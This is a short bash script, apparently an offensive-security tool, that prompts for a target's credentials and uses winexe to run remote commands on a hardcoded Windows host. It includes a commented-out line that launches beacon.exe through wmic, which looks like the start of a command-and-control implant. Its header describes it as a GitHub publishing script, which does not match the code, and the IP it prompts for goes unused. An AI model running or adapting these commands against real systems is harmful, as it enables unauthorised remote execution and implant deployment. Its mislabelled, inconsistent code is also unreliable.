#################################################
# Created by @jgaudard  :: I don't twitter much 
# bash script to publish to github, for the lazy...
# Created: 18 June 2016    Edited: 
# Version 0.1
#################################################
read -p "What is the target host's IP?: " ipaddy
read -p "What is the targets username?: " username
read -p "What is the targets password?: " password



winexe -U "$username%$password" //172.16.1.103 ipconfig
winexe -U "$username%$password" //172.16.1.103 "wmic os list brief"
#winexe -U "$username%$password" //172.16.1.103 "wmic process call create c:\windows\temp\beacon.exe"
